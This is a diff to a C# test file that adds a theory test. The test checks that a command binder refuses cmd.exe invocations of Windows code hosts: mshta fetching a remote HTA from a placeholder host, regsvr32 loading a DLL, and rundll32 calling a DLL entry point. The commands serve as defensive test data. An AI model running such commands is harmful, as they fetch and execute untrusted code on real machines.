@@ -198,6 +198,16 @@ public class ExecReusableCommandBinderTests
             cwd: null,
             env: null));
 
+    [Theory]
+    [InlineData("mshta.exe https://example.invalid/payload.hta")]
+    [InlineData("regsvr32.exe /s payload.dll")]
+    [InlineData("rundll32.exe payload.dll,EntryPoint")]
+    public void WindowsCodeHost_DoesNotBind(string payload)
+        => Assert.Null(ExecReusableCommandBinder.TryBind(
+            ["cmd.exe", "/d", "/s", "/c", payload],
+            cwd: null,
+            env: null));
+
     [Fact]
     public void TabDelimitedLiteralArguments_Bind()
     {
